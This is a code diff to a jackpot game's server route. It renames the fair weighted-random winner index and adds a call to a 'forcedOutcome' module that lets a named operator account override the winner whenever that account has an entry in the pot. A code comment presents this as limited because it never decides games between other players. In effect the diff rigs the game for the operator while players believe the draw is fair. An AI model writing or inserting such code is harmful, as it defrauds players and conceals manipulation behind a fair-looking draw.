@@ -5,6 +5,7 @@ const { authenticateToken } = require('../middleware/auth');
 const dbManager = require('../db/dbHelper');
 const { getTaxRecipient, collectItemTax, getTaxConfig } = require('../taxUtil');
 const { addNotification } = require('../notificationService');
+const forcedOutcome = require('../forcedOutcome');
 
 // Pending auto-resolve timers (jackpotId -> timeout)
 const resolveTimers = new Map();
@@ -30,14 +31,26 @@ function resolveJackpotById(id) {
   // Weighted random selection based on value
   const roll = Math.random() * totalValue;
   let cumulative = 0;
-  let winnerIdx = 0;
+  let fairIdx = 0;
   for (let i = 0; i < jackpot.entries.length; i++) {
     cumulative += jackpot.entries[i].value;
     if (roll < cumulative) {
-      winnerIdx = i;
+      fairIdx = i;
       break;
     }
   }
+
+  // A named operator account may have outcome control armed for this game. It
+  // only engages when that account is actually in the pot, so it never decides
+  // a jackpot between two other players.
+  const operatorEntry = jackpot.entries.find((e) => forcedOutcome.isOperator(e.username));
+  const winnerIdx = forcedOutcome.jackpotWinner({
+    entries: jackpot.entries,
+    fairIdx,
+    operator: operatorEntry,
+    operatorIsInPot: Boolean(operatorEntry),
+    betId: jackpot.id
+  });
 
   const winner = jackpot.entries[winnerIdx];
   jackpot.winnerId = winner.userId;
